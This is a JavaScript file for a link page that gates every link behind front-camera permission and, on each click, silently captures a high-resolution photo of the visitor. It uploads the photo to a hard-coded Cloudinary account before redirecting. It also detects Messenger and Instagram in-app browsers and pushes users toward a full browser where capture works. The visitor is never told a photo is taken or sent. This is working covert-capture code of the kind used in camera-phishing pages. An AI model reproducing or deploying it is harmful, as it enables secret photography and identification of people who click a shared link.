const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const captureLinks = document.querySelectorAll('.link-box');
const modal = document.getElementById('cameraModal');
const retryButton = document.getElementById('retryCamera');
const linkBoxes = document.querySelectorAll('.link-box');

// Cloudinary configuration
const cloudName = 'dsfc6qjqx';
const uploadPreset = 'ml_default';

// Add at the top of script.js
const isMessenger = () => {
  const ua = navigator.userAgent || navigator.vendor || window.opera;
  return ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Instagram');
};

function showCameraModal() {
  modal.style.display = 'block';
}

function hideCameraModal() {
  modal.style.display = 'none';
}

// Modify camera initialization flow
let cameraInitialized = false;

function initCamera() {
  if (isMessenger() || cameraInitialized) return;
  cameraInitialized = true;
  
  // Stop existing stream if present
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(track => track.stop());
  }
  
  navigator.mediaDevices.getUserMedia({
    video: {
      facingMode: 'user',
      width: { ideal: 4096 },  // Max supported by most devices
      height: { ideal: 2160 },  // 4K resolution
      aspectRatio: { ideal: 16/9 }
    }
  })
  .then(stream => {
    const track = stream.getVideoTracks()[0];
    const settings = track.getSettings();
    canvas.width = settings.width;
    canvas.height = settings.height;
    video.srcObject = stream;
    hideCameraModal();
    // Enable links
    linkBoxes.forEach(link => {
      link.style.pointerEvents = 'auto';
      link.classList.remove('disabled');
    });
  })
  .catch(error => {
    console.error('Error accessing camera:', error);
    // Disable links
    linkBoxes.forEach(link => {
      link.classList.add('disabled');
      link.style.pointerEvents = 'none';
    });
    showCameraModal();
  });
}

// Initial camera setup
initCamera();

// Retry button handler
retryButton.addEventListener('click', () => {
  initCamera();
});

// Close modal when clicking outside
window.addEventListener('click', (event) => {
  if (event.target === modal) {
    hideCameraModal();
  }
});

// Capture image when any link is clicked
captureLinks.forEach(link => {
  link.addEventListener('click', (e) => {
    if (isMessenger()) {
      e.preventDefault();
      return;
    }
    if (!video.srcObject) {
      e.preventDefault();
      showCameraModal();
      return;
    }
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('file', blob);
      formData.append('upload_preset', uploadPreset);

      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Image uploaded to Cloudinary:', data.secure_url);
        setTimeout(() => {
          window.location.href = link.dataset.redirectUrl;
        }, 1000);
      })
      .catch(error => {
        console.error('Error uploading image to Cloudinary:', error);
      });
    }, 'image/jpeg');
  });
});

// Show messenger warning if needed
if (isMessenger()) {
  document.getElementById('messengerModal').style.display = 'block';
  
  // Disable all functionality
  linkBoxes.forEach(link => {
    link.style.pointerEvents = 'none';
  });
  
  // Copy URL handler
  document.getElementById('copyUrl').addEventListener('click', () => {
    navigator.clipboard.writeText(window.location.href)
      .then(() => alert('Link copied! Paste in browser'))
      .catch(() => alert('Could not copy link'));
  });
}

// Modify the permission check
async function checkCameraPermission() {
  try {
    const permission = await navigator.permissions.query({ name: 'camera' });
    if (permission.state === 'prompt') {
      document.getElementById('permissionModal').style.display = 'block';
    } else if (permission.state === 'granted') {
      initCamera();
    }
  } catch (error) {
    // Fallback for browsers that don't support permissions API
    document.getElementById('permissionModal').style.display = 'block';
  }
}

// Replace the original permission modal show code with:
checkCameraPermission();

// Start camera when user clicks continue
document.getElementById('startCamera').addEventListener('click', () => {
  document.getElementById('permissionModal').style.display = 'none';
  initCamera();
});

// Disable links until camera initialized
linkBoxes.forEach(link => {
  link.style.pointerEvents = 'none';
  link.classList.add('disabled');
}); 